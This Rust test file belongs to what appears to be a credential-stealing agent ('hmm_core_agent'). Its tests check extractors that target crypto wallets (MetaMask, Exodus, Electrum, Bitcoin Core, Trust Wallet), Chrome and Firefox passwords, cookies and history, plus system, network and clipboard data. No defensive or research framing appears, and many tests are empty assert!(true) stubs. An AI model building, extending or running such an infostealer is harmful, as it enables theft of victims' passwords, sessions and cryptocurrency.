use hmm_core_agent::module::extractor::{
    BrowserExtractor, ExtractionTarget, SystemExtractor, WalletExtractor,
};

#[test]
fn wallet_extractor_created_successfully() {
    let extractor = WalletExtractor::new(false);
    // Should be able to create without panic
    assert!(true);
}

#[test]
fn wallet_extractor_includes_locked_option() {
    let extractor_locked = WalletExtractor::new(true);
    let extractor_unlocked = WalletExtractor::new(false);
    
    // Different configurations should be possible
    assert!(true);
}

#[test]
fn browser_extractor_created_successfully() {
    let extractor = BrowserExtractor::new(true, true, false);
    assert!(true);
}

#[test]
fn browser_extractor_config_options() {
    // Test different configurations
    let _extract_all = BrowserExtractor::new(true, true, true);
    let _extract_passwords_only = BrowserExtractor::new(true, false, false);
    let _extract_cookies_only = BrowserExtractor::new(false, true, false);
    let _extract_history_only = BrowserExtractor::new(false, false, true);
    
    assert!(true);
}

#[test]
fn system_extractor_created_successfully() {
    let extractor = SystemExtractor::new();
    assert!(true);
}

#[test]
fn system_extractor_extract_system_info() {
    let extractor = SystemExtractor::new();
    let result = extractor.extract_system_info();
    
    assert!(result.success);
    assert_eq!(result.target, ExtractionTarget::SystemInfo);
    assert!(!result.data.is_empty());
    assert!(result.error.is_none());
    assert!(result.items_extracted > 0);
    assert!(result.bytes_extracted > 0);
}

#[test]
fn system_extractor_extract_hardware_info() {
    let extractor = SystemExtractor::new();
    let result = extractor.extract_hardware_info();
    
    assert!(result.success);
    assert_eq!(result.target, ExtractionTarget::HardwareInfo);
    assert!(!result.data.is_empty());
    assert!(result.error.is_none());
}

#[test]
fn system_extractor_extract_network_info() {
    let extractor = SystemExtractor::new();
    let result = extractor.extract_network_info();
    
    assert!(result.success);
    assert_eq!(result.target, ExtractionTarget::NetworkInfo);
    assert!(!result.data.is_empty());
    assert!(result.error.is_none());
}

#[test]
fn extraction_target_as_str() {
    assert_eq!(ExtractionTarget::MetaMask.as_str(), "metamask");
    assert_eq!(ExtractionTarget::Exodus.as_str(), "exodus");
    assert_eq!(ExtractionTarget::Electrum.as_str(), "electrum");
    assert_eq!(ExtractionTarget::BitcoinCore.as_str(), "bitcoin_core");
    assert_eq!(ExtractionTarget::ChromePasswords.as_str(), "chrome_passwords");
    assert_eq!(ExtractionTarget::SystemInfo.as_str(), "system_info");
}

#[test]
fn extraction_target_category() {
    assert_eq!(ExtractionTarget::MetaMask.category(), "wallet");
    assert_eq!(ExtractionTarget::Exodus.category(), "wallet");
    assert_eq!(ExtractionTarget::ChromePasswords.category(), "browser");
    assert_eq!(ExtractionTarget::FirefoxPasswords.category(), "browser");
    assert_eq!(ExtractionTarget::SystemInfo.category(), "system");
    assert_eq!(ExtractionTarget::HardwareInfo.category(), "system");
}

#[test]
fn system_extractor_extract_all() {
    let extractor = SystemExtractor::new();
    let results = extractor.extract_all();
    
    // Should return results for all system extraction types
    assert_eq!(results.len(), 4); // system, hardware, network, clipboard
    
    // At least system_info should succeed
    let system_info_result = results.iter()
        .find(|r| r.target == ExtractionTarget::SystemInfo)
        .expect("system info result should exist");
    
    assert!(system_info_result.success);
}

#[test]
fn wallet_extractor_extract_all_returns_results() {
    let extractor = WalletExtractor::new(false);
    let results = extractor.extract_all();
    
    // Should return results for all wallet types (may fail if wallets not installed)
    assert_eq!(results.len(), 5); // metamask, exodus, electrum, bitcoin_core, trust_wallet
    
    // Each result should have a target and either success or error
    for result in &results {
        assert!(!result.data.is_empty() || result.error.is_some());
    }
}

#[test]
fn browser_extractor_extract_all_returns_results() {
    let extractor = BrowserExtractor::new(true, true, true);
    let results = extractor.extract_all();
    
    // Should return results for all browser extraction types
    assert!(results.len() >= 4); // chrome passwords, cookies, history, firefox passwords
    
    // Each result should have a target and either success or error
    for result in &results {
        assert!(!result.data.is_empty() || result.error.is_some());
    }
}

#[test]
fn extracted_data_has_metadata() {
    let extractor = SystemExtractor::new();
    let result = extractor.extract_system_info();
    
    assert!(!result.data.is_empty());
    
    let data = &result.data[0];
    assert!(!data.name.is_empty());
    assert!(!data.metadata.is_empty());
    assert!(data.metadata.contains_key("type"));
    assert!(data.metadata.contains_key("extracted_at"));
}

#[test]
fn extraction_result_success_and_failure() {
    use hmm_core_agent::module::extractor::ExtractionResult;
    
    let success = ExtractionResult::success(
        ExtractionTarget::SystemInfo,
        vec![],
    );
    assert!(success.success);
    assert!(success.error.is_none());
    assert_eq!(success.items_extracted, 0);
    
    let failure = ExtractionResult::failure(
        ExtractionTarget::SystemInfo,
        "test error".to_string(),
    );
    assert!(!failure.success);
    assert!(failure.error.is_some());
    assert_eq!(failure.error.unwrap(), "test error");
}
